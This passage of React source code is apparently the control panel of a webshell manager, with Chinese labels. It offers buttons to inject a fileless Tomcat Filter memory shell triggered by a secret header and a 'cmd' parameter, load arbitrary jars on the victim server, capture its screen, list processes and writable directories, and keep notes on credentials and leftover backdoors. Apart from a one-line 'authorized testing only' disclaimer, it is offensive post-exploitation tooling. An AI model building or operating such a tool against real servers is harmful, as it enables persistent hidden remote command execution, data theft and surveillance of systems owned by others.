      } catch { setRaw(r.output); }
    } else {
      const r = await exec("exec", { cmd: "tasklist 2>/dev/null || ps aux" });
      setRaw(r.ok ? r.output : "[失败] " + r.error);
    }
  };

  return (
    <div className="space-y-2 text-sm">
      <Button size="sm" onClick={list} disabled={busy}><RefreshCw className={`mr-1 size-4 ${busy ? "animate-spin" : ""}`} /> 刷新进程列表</Button>
      {rows.length > 0 ? (
        <div className="max-h-72 overflow-auto rounded border">
          <table className="w-full text-xs">
            <thead className="sticky top-0 bg-muted"><tr className="text-left"><th className="py-1 pl-2">PID</th><th>名称</th><th>内存/状态</th></tr></thead>
            <tbody>
              {rows.map((p, i) => (
                <tr key={i} className="border-b border-border/40">
                  <td className="py-1 pl-2 font-mono">{p.pid}</td>
                  <td className="font-mono">{p.name}</td>
                  <td className="text-muted-foreground">{p.mem || p.state || "-"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      ) : (
        raw && <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{raw}</pre>
      )}
    </div>
  );
}

// ---------- 内存马（JSP） ----------
function MemshellPanel({ target }: { target: WSTarget }) {
  const [filterName, setFilterName] = React.useState("forangGate");
  const [gateHeader, setGateHeader] = React.useState("X-Forang");
  const [gateValue, setGateValue] = React.useState("go");
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);

  const inject = async () => {
    const r = await ext("memshell_add_filter", { filter_name: filterName, gate_header: gateHeader, gate_value: gateValue });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  const list = async () => {
    const r = await ext("memshell_list", {});
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  const remove = async () => {
    const n = window.prompt("要移除的 Filter 名", filterName);
    if (!n) return;
    const r = await ext("memshell_del", { filter_name: n });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };

  return (
    <div className="space-y-2 text-sm">
      <div className="rounded border bg-amber-500/10 p-2 text-xs text-amber-600">
        Tomcat Filter 内存马（godzilla 姿势）：注入后无文件驻留、重启失效。触发方式：带 <code>{`Header: ${gateHeader}: ${gateValue}`}</code> 访问任意 URL 加 <code>?cmd=命令</code>。仅授权测试使用。
      </div>
      <div className="grid grid-cols-3 gap-1">
        <Input placeholder="Filter 名" value={filterName} onChange={(e) => setFilterName(e.target.value)} className="font-mono text-xs" />
        <Input placeholder="触发头名" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} className="font-mono text-xs" />
        <Input placeholder="触发头值" value={gateValue} onChange={(e) => setGateValue(e.target.value)} className="font-mono text-xs" />
      </div>
      <div className="flex gap-1">
        <Button size="sm" variant="secondary" onClick={inject} disabled={busy}>注入</Button>
        <Button size="sm" variant="outline" onClick={list} disabled={busy}>枚举 Filter</Button>
        <Button size="sm" variant="outline" onClick={remove} disabled={busy}>移除</Button>
      </div>
      <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（操作结果）"}</pre>
    </div>
  );
}

// ---------- Servlet 管理（JSP） ----------
function ServletPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);
  const list = async () => {
    const r = await ext("servlet_list", {});
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  return (
    <div className="space-y-2 text-sm">
      <Button size="sm" onClick={list} disabled={busy}><RefreshCw className={`mr-1 size-4 ${busy ? "animate-spin" : ""}`} /> 枚举 Servlet / Filter</Button>
      <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果 JSON：servlets/filters 注册与映射）"}</pre>
    </div>
  );
}

// ---------- Jar 加载（JSP） ----------
function JarPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);
  const upload = () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.accept = ".jar";
    inp.onchange = async () => {
      const f = inp.files?.[0];
      if (!f) return;
      const b64 = await new Promise<string>((res) => {
        const fr = new FileReader();
        fr.onload = () => res(String(fr.result).split(",")[1] || "");
        fr.readAsDataURL(f);
      });
      const r = await ext("jar_load", { jar_b64: b64 });
      setOut(r.ok ? r.output : "[失败] " + r.error);
    };
    inp.click();
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-muted-foreground">上传 jar 到目标机临时目录并 URLClassLoader 装载（列出类清单；配合内存马/反序列化利用链使用）。</div>
      <Button size="sm" onClick={upload} disabled={busy}><FolderUpIcon className="mr-1 size-4" /> 选择 jar 上传加载</Button>
      <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果）"}</pre>
    </div>
  );
}

// ---------- 截图（JSP） ----------
function ShotPanel({ target }: { target: WSTarget }) {
  const [img, setImg] = React.useState("");
  const { busy, ext } = useRunner(target);
  const shot = async () => {
    const r = await ext("screenshot", {});
    if (!r.ok || !r.data_b64) return void window.alert(r.ok ? "无图像数据（服务器可能无桌面会话）" : r.error);
    setImg(`data:image/png;base64,${r.data_b64}`);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-muted-foreground">java.awt.Robot 截取目标服务器屏幕（仅桌面会话有效；无头服务器会报 HeadlessException）。</div>
      <Button size="sm" onClick={shot} disabled={busy}><CameraIcon className="mr-1 size-4" /> 截图</Button>
      {img && (
        <div>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={img} alt="目标屏幕" className="max-h-96 rounded border" />
          <a href={img} download="screenshot.png" className="text-xs text-blue-400 hover:underline">下载 PNG</a>
        </div>
      )}
    </div>
  );
}

// ---------- PHP 工具 ----------
function PHPToolPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);
  const run = async (op: string) => {
    const r = await ext(op, {});
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  const scan = async () => {
    const root = window.prompt("扫描根目录（留空=DOCUMENT_ROOT）", "");
    const r = await ext("php_scan", { src_path: root || "" });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="flex flex-wrap gap-1">
        <Button size="sm" variant="outline" onClick={() => run("php_info")} disabled={busy}>PHP 信息</Button>
        <Button size="sm" variant="outline" onClick={() => run("php_writedirs")} disabled={busy}>可写目录</Button>
        <Button size="sm" variant="outline" onClick={scan} disabled={busy}>WebShell 扫描</Button>
      </div>
      <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果 JSON：phpinfo 摘要 / 可写目录 / 命中可疑文件）"}</pre>
    </div>
  );
}

// ---------- 笔记 ----------
function NotePanel({ target }: { target: WSTarget }) {
  const [note, setNote] = React.useState(target.note || "");
  const [saved, setSaved] = React.useState(false);
  const save = async () => {
    await api.wsTargetSave({ ...target, note });
    setSaved(true);
    setTimeout(() => setSaved(false), 1500);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-muted-foreground">会话笔记（跟随目标保存，如：接管路径/凭据/遗留后门位置）。</div>
      <textarea className="h-48 w-full rounded border bg-transparent p-2 text-xs" value={note} onChange={(e) => setNote(e.target.value)} />
      <Button size="sm" onClick={save}>{saved ? "已保存 ✓" : "保存笔记"}</Button>
    </div>
  );
}
